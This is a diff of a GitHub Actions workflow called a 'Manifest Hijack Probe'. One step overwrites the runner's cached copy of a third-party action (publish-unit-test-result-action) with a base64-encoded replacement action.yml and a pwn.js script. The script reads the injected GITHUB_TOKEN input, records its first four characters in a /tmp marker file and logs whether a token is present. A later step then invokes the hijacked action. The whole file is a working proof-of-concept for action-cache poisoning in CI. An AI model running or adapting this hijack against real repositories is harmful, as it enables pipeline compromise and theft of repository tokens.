@@ -1,4 +1,4 @@
-name: zz Manifest Hijack Probe
+name: zz Docker Action Manifest Hijack Probe
 on:
   workflow_dispatch:
 permissions:
@@ -7,20 +7,16 @@ jobs:
   t:
     runs-on: ubuntu-latest
     steps:
-      - name: hijack manifest of a later action
+      - name: hijack container action manifest
         env:
-          MANIFEST_B64: "bmFtZTogcHduCmRlc2NyaXB0aW9uOiBtYW5pZmVzdCBoaWphY2sgcHJvYmUKaW5wdXRzOgogIGdpdGh1Yl90b2tlbjoKICAgIGRlZmF1bHQ6ICR7eyBnaXRodWIudG9rZW4gfX0KcnVuczoKICB1c2luZzogbm9kZTIwCiAgbWFpbjogcHduLmpzCg=="
-          JS_B64: "Y29uc3QgZnM9cmVxdWlyZSgnZnMnKTsKdHJ5e2ZzLmFwcGVuZEZpbGVTeW5jKCcvdG1wL3B3bl9tYXJrZXIudHh0JywnUFdORURfRVhFQyB0b2tlbj0nKyhwcm9jZXNzLmVudi5JTlBVVF9HSVRIVUJfVE9LRU4/cHJvY2Vzcy5lbnYuSU5QVVRfR0lUSFVCX1RPS0VOLnNsaWNlKDAsNCk6J25vbmUnKSsnXG4nKTt9Y2F0Y2goZSl7fQpjb25zb2xlLmxvZygnUFdORURfQUNUSU9OX01BTklGRVNUX0VYRUNVVEVEIHRva2VuX3ByZXNlbnQ9JyshIXByb2Nlc3MuZW52LklOUFVUX0dJVEhVQl9UT0tFTik7Cg=="
+          MANIFEST_B64: "bmFtZTogcHduCmRlc2NyaXB0aW9uOiBtYW5pZmVzdCBoaWphY2sgcHJvYmUKaW5wdXRzOgogIGdpdGh1Yi10b2tlbjoKICAgIGRlZmF1bHQ6ICR7eyBnaXRodWIudG9rZW4gfX0KICBnaXRodWJfdG9rZW46CiAgICBkZWZhdWx0OiAke3sgZ2l0aHViLnRva2VuIH19CnJ1bnM6CiAgdXNpbmc6IG5vZGUyMAogIG1haW46IHB3bi5qcwo="
+          JS_B64: "Y29uc3QgZnM9cmVxdWlyZSgnZnMnKTsKY29uc3QgdD1wcm9jZXNzLmVudlsnSU5QVVRfR0lUSFVCLVRPS0VOJ118fHByb2Nlc3MuZW52LklOUFVUX0dJVEhVQl9UT0tFTnx8Jyc7CnRyeXtmcy5hcHBlbmRGaWxlU3luYygnL3RtcC9wd25fbWFya2VyLnR4dCcsJ1BXTkVEX0VYRUMgdG9rZW49JysodD90LnNsaWNlKDAsNCk6J25vbmUnKSsnXG4nKTt9Y2F0Y2goZSl7fQpjb25zb2xlLmxvZygnUFdORURfQUNUSU9OX01BTklGRVNUX0VYRUNVVEVEIHRva2VuX3ByZXNlbnQ9JyshIXQpOwo="
         run: |
-          base="$(dirname "$GITHUB_WORKSPACE")"
-          d="$base/_actions/EnricoMi/publish-unit-test-result-action/c950f6fb443cb5af20a377fd0dfaa78838901040"
-          echo "ACTIONS_DIR=$d"
-          ls -la "$d" 2>&1 | head -8
-          printf '%s' "$MANIFEST_B64" | base64 -d > "$d/action.yml"
-          printf '%s' "$JS_B64" | base64 -d > "$d/pwn.js"
-          ls -l "$d/action.yml" "$d/pwn.js"
-      - name: later step uses the action
-        id: pub
+          d=/home/runner/work/_actions/EnricoMi/publish-unit-test-result-action/c950f6fb443cb5af20a377fd0dfaa78838901040
+          echo "--- target ---"; ls -la "$d" 2>&1 | head -8
+          printf '%s' "$MANIFEST_B64" | base64 -d > "$d/action.yml" && echo WROTE_MANIFEST
+          printf '%s' "$JS_B64" | base64 -d > "$d/pwn.js" && echo WROTE_JS
+      - name: use hijacked container action
         uses: EnricoMi/publish-unit-test-result-action@c950f6fb443cb5af20a377fd0dfaa78838901040
         with:
           files: "none.xml"
